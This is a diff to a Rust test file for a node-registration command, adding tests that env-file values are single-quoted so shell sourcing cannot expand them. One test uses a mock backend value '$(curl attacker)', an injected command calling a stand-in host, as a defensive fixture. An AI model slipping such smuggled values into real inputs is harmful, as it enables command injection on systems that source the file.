@@ -55,11 +55,12 @@ fn register_success_writes_envfile() {
     register::run(args_for(tmp.path(), server.url())).expect("register succeeds");
 
     let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
-    assert!(env.contains("NODE_ID=\"node-123\""));
-    assert!(env.contains("BACKEND_ENDPOINT=\"1.2.3.4:5349\""));
-    assert!(env.contains("TURN_SECRET=\"ts-deadbeef\""));
-    assert!(env.contains("REALITY_ENCRYPTION=\"mlkem768x25519plus\""));
-    assert!(env.contains("RELAY_JWT_SECRET=\"rjs-cafebabe\""));
+    // Single-quoted values — bash source treats them literally (no $-expansion).
+    assert!(env.contains("NODE_ID='node-123'"));
+    assert!(env.contains("BACKEND_ENDPOINT='1.2.3.4:5349'"));
+    assert!(env.contains("TURN_SECRET='ts-deadbeef'"));
+    assert!(env.contains("REALITY_ENCRYPTION='mlkem768x25519plus'"));
+    assert!(env.contains("RELAY_JWT_SECRET='rjs-cafebabe'"));
     mock.assert();
 
     #[cfg(unix)]
@@ -211,5 +212,80 @@ fn register_transport_error_retries_then_fails() {
     assert!(
         matches!(err, SecretsError::Transport { .. }),
         "expected Transport after exhausted retries, got: {err:?}"
+    );
+}
+
+#[test]
+fn register_envfile_resists_dollar_command_substitution() {
+    // Backend returns value containing $() — must NOT be interpreted as
+    // command substitution when env-file is sourced. Single-quoting in
+    // write_env_file prevents this.
+    let mut server = mockito::Server::new();
+    let _m = server
+        .mock("POST", "/api/partner/register")
+        .with_status(200)
+        .with_body(
+            r#"{
+            "node_id": "n",
+            "backend_endpoint": "1.2.3.4:5349",
+            "turn_secret": "$(curl attacker)",
+            "reality_uuid": "11111111-2222-3333-4444-555555555555",
+            "reality_public_key": "RK",
+            "reality_short_id": "0123",
+            "reality_server_name": "x",
+            "reality_encryption": "mlkem768x25519plus",
+            "relay_jwt_secret": "rjs",
+            "turns_subdomain": "d"
+        }"#,
+        )
+        .create();
+    let tmp = TempDir::new().unwrap();
+    make_files(tmp.path());
+    register::run(args_for(tmp.path(), server.url())).expect("register succeeds");
+
+    let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
+    // Value preserved verbatim inside single quotes — bash 'source' treats
+    // single-quoted strings literally; $(...) is NOT expanded.
+    assert!(
+        env.contains("TURN_SECRET='$(curl attacker)'"),
+        "env-file must single-quote dangerous values; got:\n{env}"
+    );
+    // Double-quoted form would be the bug we are guarding against.
+    assert!(
+        !env.contains("TURN_SECRET=\""),
+        "env-file MUST NOT use double quotes — they enable $-expansion at source time"
+    );
+}
+
+#[test]
+fn register_envfile_escapes_embedded_single_quote() {
+    let mut server = mockito::Server::new();
+    let _m = server
+        .mock("POST", "/api/partner/register")
+        .with_status(200)
+        .with_body(
+            r#"{
+            "node_id": "abc'def",
+            "backend_endpoint": "1.2.3.4:5349",
+            "turn_secret": "ts",
+            "reality_uuid": "11111111-2222-3333-4444-555555555555",
+            "reality_public_key": "RK",
+            "reality_short_id": "0123",
+            "reality_server_name": "x",
+            "reality_encryption": "mlkem768x25519plus",
+            "relay_jwt_secret": "rjs",
+            "turns_subdomain": "d"
+        }"#,
+        )
+        .create();
+    let tmp = TempDir::new().unwrap();
+    make_files(tmp.path());
+    register::run(args_for(tmp.path(), server.url())).expect("register succeeds");
+
+    let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
+    // Canonical bash single-quote escape: 'abc'\''def'
+    assert!(
+        env.contains("NODE_ID='abc'\\''def'"),
+        "expected canonical single-quote escape, got: {env}"
     );
 }
